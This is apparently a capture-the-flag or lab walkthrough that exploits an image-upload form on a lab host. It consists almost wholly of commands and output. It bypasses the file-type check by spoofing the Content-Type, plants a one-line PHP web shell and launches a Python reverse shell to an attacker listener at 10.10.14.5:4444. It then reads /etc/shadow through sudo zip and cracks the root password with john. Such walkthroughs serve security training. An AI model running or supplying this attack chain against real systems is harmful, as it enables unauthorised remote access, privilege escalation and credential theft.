### Initial Discovery
```
# Web form at http://10.10.10.25/upload
# Accepts images only

# Test upload
curl -F "file=@test.jpg" http://10.10.10.25/upload
# File uploaded to /uploads/test.jpg
```
#### Test Restrictions
```
# Try PHP file
curl -F "file=@shell.php" http://10.10.10.25/upload
# Only JPG, PNG, GIF files allowed

# Try double extension
cp shell.php shell.php.jpg
curl -F "file=@shell.php.jpg" http://10.10.10.25/upload
# File uploaded to /uploads/shell.php.jpg

# Check if executed
curl http://10.10.10.25/uploads/shell.php.jpg?cmd=id
# File not found - not executing
```

#### Content-Type Bypass
```
# Change Content-Type header
curl -F "file=@shell.php;type=image/jpeg" http://10.10.10.25/upload
# Uploaded as shell.php

# Check execution
curl http://10.10.10.25/uploads/shell.php?cmd=id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
# Success!
```

#### Get Reverse Shell
```
# Use PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -F "file=@shell.php;type=image/jpeg" http://10.10.10.25/upload

# Test command execution
curl "http://10.10.10.25/uploads/shell.php?cmd=whoami"
# www-data

# Get reverse shell
curl "http://10.10.10.25/uploads/shell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"

# On attacker
nc -lvnp 4444
# Connection from 10.10.10.25
# www-data@target:/var/www/html/uploads$
```

#### Privilege Escalation
```
# Check sudo
sudo -l
# (ALL : ALL) NOPASSWD: /usr/bin/zip

# GTFOBins for zip
# Use zip to read files
sudo zip /tmp/evil.zip /etc/shadow
sudo unzip -p /tmp/evil.zip
# root:$6$...:18555:0:99999:7:::

# Crack root hash
john --wordlist=rockyou.txt hash.txt
# password123

# Switch to root
su root
# password123

# Root access!
whoami
# root
```

